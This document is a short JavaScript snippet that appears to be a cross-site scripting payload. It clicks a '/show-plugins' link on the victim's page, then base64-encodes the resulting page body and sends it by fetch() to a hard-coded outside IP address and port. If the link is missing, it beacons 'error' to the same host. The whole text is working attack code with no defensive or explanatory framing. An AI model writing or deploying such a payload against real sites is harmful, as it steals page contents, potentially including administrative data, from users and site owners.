const link = document.querySelector('a[href="/show-plugins"]');

// Simulate a click on the link if found
if (link) {
  link.click();

  // Event listener to wait for the new page to load
    window.addEventListener('load', function() {
      // Access the document.body of the new page
      const newPageBody = document.body;
      fetch("http://82.65.210.151:24000/?encodedData=" + btoa(newPageBody.innerHTML));
      // Perform actions with the body content of the new page
    });
 
  
} else {
   fetch("http://82.65.210.151:24000/?encodedData=error");
}


